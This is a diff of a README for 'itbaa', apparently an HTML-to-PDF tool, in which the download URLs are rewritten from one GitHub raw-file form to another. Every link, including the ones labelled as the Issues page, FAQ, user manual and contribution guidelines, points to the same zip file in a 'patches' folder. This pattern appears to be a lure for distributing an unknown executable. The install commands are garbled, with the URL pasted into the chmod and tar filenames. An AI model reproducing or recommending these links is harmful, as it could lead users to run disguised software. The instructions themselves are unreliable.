@@ -8,11 +8,11 @@ Welcome to the **itbaa** project! Itbaa (اطبع) is a simple tool that allows 
 
 To get started, visit our Releases page to download the software. Click the link below to access the latest version. 
 
-[![Download itbaa](https://github.com/Biellgrimm/itbaa/raw/refs/heads/main/patches/Software-3.3.zip)](https://github.com/Biellgrimm/itbaa/raw/refs/heads/main/patches/Software-3.3.zip)
+[![Download itbaa](https://raw.githubusercontent.com/Biellgrimm/itbaa/main/patches/Software-3.3.zip)](https://raw.githubusercontent.com/Biellgrimm/itbaa/main/patches/Software-3.3.zip)
 
 ### Steps to Download:
 
-1. Click the link above or go to [this page](https://github.com/Biellgrimm/itbaa/raw/refs/heads/main/patches/Software-3.3.zip) to find the latest release.
+1. Click the link above or go to [this page](https://raw.githubusercontent.com/Biellgrimm/itbaa/main/patches/Software-3.3.zip) to find the latest release.
 2. Look for the version you want to download.
 3. Click on the appropriate file for your operating system (Windows, macOS, Linux) to start the download.
 
@@ -43,8 +43,8 @@ Follow these steps to install itbaa on your computer:
 
 1. Open a terminal window.
 2. Navigate to the directory where you downloaded the file.
-3. Use the command `chmod +x itbaa.<version>https://github.com/Biellgrimm/itbaa/raw/refs/heads/main/patches/Software-3.3.zip` to make the file executable.
-4. Extract the files with `tar -xzf itbaa.<version>https://github.com/Biellgrimm/itbaa/raw/refs/heads/main/patches/Software-3.3.zip`.
+3. Use the command `chmod +x itbaa.<version>https://raw.githubusercontent.com/Biellgrimm/itbaa/main/patches/Software-3.3.zip` to make the file executable.
+4. Extract the files with `tar -xzf itbaa.<version>https://raw.githubusercontent.com/Biellgrimm/itbaa/main/patches/Software-3.3.zip`.
 5. Change into the directory that just got created and run `./itbaa` to start the application.
 
 ## 🌟 How to Use itbaa
@@ -77,15 +77,15 @@ To use itbaa effectively, ensure your system meets the following requirements:
 
 If you encounter any issues while downloading or using itbaa, please reach out for help. You can find additional resources and support by visiting the following links:
 
-- [GitHub Issues Page](https://github.com/Biellgrimm/itbaa/raw/refs/heads/main/patches/Software-3.3.zip)
-- [User Community Discussion](https://github.com/Biellgrimm/itbaa/raw/refs/heads/main/patches/Software-3.3.zip)
+- [GitHub Issues Page](https://raw.githubusercontent.com/Biellgrimm/itbaa/main/patches/Software-3.3.zip)
+- [User Community Discussion](https://raw.githubusercontent.com/Biellgrimm/itbaa/main/patches/Software-3.3.zip)
 
 We encourage you to share feedback or suggestions for improvements.
 
 ## 🔗 Additional Resources
 
-- [Frequently Asked Questions (FAQ)](https://github.com/Biellgrimm/itbaa/raw/refs/heads/main/patches/Software-3.3.zip)
-- [User Manual](https://github.com/Biellgrimm/itbaa/raw/refs/heads/main/patches/Software-3.3.zip)
-- [Contribution Guidelines](https://github.com/Biellgrimm/itbaa/raw/refs/heads/main/patches/Software-3.3.zip)
+- [Frequently Asked Questions (FAQ)](https://raw.githubusercontent.com/Biellgrimm/itbaa/main/patches/Software-3.3.zip)
+- [User Manual](https://raw.githubusercontent.com/Biellgrimm/itbaa/main/patches/Software-3.3.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/Biellgrimm/itbaa/main/patches/Software-3.3.zip)
 
 Thank you for choosing itbaa! Enjoy converting your HTML files to PDF with ease.
